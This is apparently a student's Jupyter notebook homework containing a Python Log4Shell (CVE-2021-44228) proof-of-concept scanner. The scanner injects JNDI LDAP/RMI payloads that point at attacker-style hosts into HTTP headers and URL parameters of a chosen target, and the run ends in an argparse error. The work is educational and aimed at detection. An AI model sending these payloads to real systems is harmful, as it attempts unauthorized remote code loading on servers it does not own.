# Домашняя работа 10 Верстов Родион

In [4]:
import requests
import argparse
import time

# Конфигурация
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (CVE-2021-44228 PoC)',
    'X-Api-Version': '${jndi:ldap:// attackers-server.com/exploit}',
    'Referer': 'https://google.com/search?q=${jndi:ldap://example.com/hello}'
}

PAYLOADS = [
    '${jndi:ldap://malicious-site.com/a}',
    '${jndi:ldap://127.0.0.1:1389/Exploit}',
    '${jndi:rmi://attacker.ru/hello}',
    '${jndi:ldap://${hostName}.collaborator.com/poc}'
]


def test_cve_2021_44228(target_url):
    """
    Проверяет целевую систему на наличие уязвимости Log4Shell.
    Имитирует атаку без нанесения вреда.
    """
    print("[*] Запуск проверки CVE-2021-44228 (Log4Shell)")
    print(f"[*] Цель: {target_url}")
    print("[*] Имитация отправки эксплойта...\n")

    vulnerable = False
    for i, payload in enumerate(PAYLOADS):
        # Формируем заголовки с инъекцией
        headers = HEADERS.copy()
        headers['X-Payload-Test'] = payload

        # Добавляем параметр в URL для GET-запросов (эмуляция)
        full_url = f"{target_url}/?test={payload.replace('$', '%24').replace('{', '%7B').replace('}', '%7D')}"

        print(f"[Тест #{i + 1}] Отправка: {payload}")
        print(f"[+] GET параметр: test={payload}")
        print(f"[+] Header: X-Payload-Test: {payload}")
        print(f"[+] Header: User-Agent: {headers['User-Agent']}")

        try:
            # Отправляем запрос
            start_time = time.time()
            response = requests.get(full_url, headers=headers, timeout=5, verify=False, allow_redirects=False)
            response_time = time.time() - start_time

            # Анализ ответа (имитация)
            if response.status_code == 200:
                print(f"[+] Ответ сервера: {response.status_code} OK")
                print(f"[+] Время ответа: {response_time:.2f} сек")

                # Косвенные признаки уязвимости (для PoC)
                if "error" in response.text.lower() and "jndi" in response.text.lower():
                    print("[!!!] Найдено упоминание 'jndi' в ошибке. Возможно, уязвимость сработала!")
                    vulnerable = True
                elif response_time > 3.0:
                    print("[?] Подозрительная задержка ответа (возможно обращение к внешнему LDAP серверу).")
                    vulnerable = True
                else:
                    print("[-] Явных признаков уязвимости в ответе не обнаружено.")
            else:
                print(f"[-] Ответ сервера: {response.status_code}. Уязвимость не подтверждена напрямую.")
        except requests.exceptions.ConnectionError:
            print("[!] Ошибка соединения. Возможно, сервер упал или заблокировал запрос (имитация DoS).")
        except requests.exceptions.Timeout:
            print("[!] Таймаут. Сервер долго не отвечает — возможна обработка JNDI-запроса.")
        except Exception as e:
            print(f"[!] Неизвестная ошибка: {e}")

        print("-" * 50)
        # Небольшая задержка между тестами
        time.sleep(0.5)

    if vulnerable:
        print("\n[КРИТИЧНО] Система потенциально уязвима к CVE-2021-44228. Рекомендуется обновить Log4j до версии 2.17.0+.")
    else:
        print("\n[ОК] Система не проявила явных признаков уязвимости.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='PoC для CVE-2021-44228 (Log4Shell). Имитация атаки.')
    parser.add_argument('-u', '--url', type=str, default='http://example.com',
                        help='URL целевого сервера (по умолчанию: http://example.com)')
    args = parser.parse_args()

    test_cve_2021_44228(args.url)

usage: ipykernel_launcher.py [-h] [-u URL]
ipykernel_launcher.py: error: unrecognized arguments: -f C:\Users\RODIO\AppData\Roaming\jupyter\runtime\kernel-5ef9ca04-f006-4795-bbc7-171d765f05e9.json


SystemExit: 2